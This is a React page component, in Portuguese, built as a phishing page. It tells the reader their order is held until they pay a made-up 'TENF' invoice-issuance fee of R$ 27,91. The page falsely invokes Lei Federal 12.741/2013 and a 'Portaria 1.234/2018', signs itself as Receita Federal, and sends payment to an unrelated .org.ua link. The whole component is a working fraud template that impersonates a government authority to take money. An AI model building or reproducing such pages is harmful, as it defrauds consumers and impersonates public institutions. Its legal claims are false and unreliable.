const Index = () => {
  return (
    <div className="min-h-screen bg-background flex flex-col">
      {/* Header */}
      <div className="bg-primary py-4 px-4">
        <h2 className="text-center text-primary-foreground font-bold text-xl">
          Seu pedido ainda está pendente...
        </h2>
      </div>

      {/* Content */}
      <div className="px-4 py-5 flex-1 flex flex-col justify-center">
        <div className="bg-card rounded-xl shadow-md p-5 flex flex-col">
          {/* Info Text */}
          <div className="text-center mb-5">
            <p className="text-card-foreground leading-relaxed text-base">
              Para que possamos enviar seu produto, é{" "}
              <span className="text-[hsl(var(--highlight))] font-bold">obrigatório</span>{" "}
              o pagamento da{" "}
              <strong>TENF (Taxa de Emissão da Nota Fiscal)</strong>, conforme
              determina a <strong>Lei Federal 12.741/2013</strong> e a Portaria
              1.234/2018 da Receita Federal. Sem ela,{" "}
              <span className="text-[hsl(var(--highlight))] font-bold">
                não podemos prosseguir com a entrega
              </span>
              .
            </p>
          </div>

          {/* Order Info */}
          <div className="bg-background rounded-xl p-5 mb-5 text-center space-y-2">
            <p className="text-card-foreground text-base">
              <strong>Número do pedido:</strong> 00044792
            </p>
            <p className="text-card-foreground text-base">
              <strong>Status:</strong>{" "}
              <span className="text-[hsl(210,90%,45%)] font-bold">
                Aguardando pagamento da TENF
              </span>
            </p>
            <p className="text-card-foreground text-base">
              <strong>Valor da TENF:</strong> R$ 27,91
            </p>
          </div>


          {/* CTA Button */}
          <div className="text-center">
            <a
              href="https://compraseguraonline.org.ua/c/573a847faa"
              target="_blank"
              rel="noopener noreferrer"
              className="block bg-[hsl(210,80%,42%)] hover:bg-[hsl(210,80%,36%)] text-primary-foreground font-extrabold py-4 px-4 rounded-xl text-sm whitespace-nowrap transition-colors text-center"
            >
              REALIZAR PAGAMENTO DA TENF
            </a>
          </div>
        </div>

        {/* Footer */}
        <div className="text-center mt-4 space-y-1 pb-2">
          <p className="text-xs text-[hsl(210,80%,42%)]">
            <a href="#" className="hover:underline">TERMOS DE USO</a>
            {" | "}
            <a href="#" className="hover:underline">POLÍTICA DE PRIVACIDADE</a>
          </p>
          <p className="text-xs text-muted-foreground">© Receita Federal</p>
        </div>
      </div>
    </div>
  );
};

export default Index;
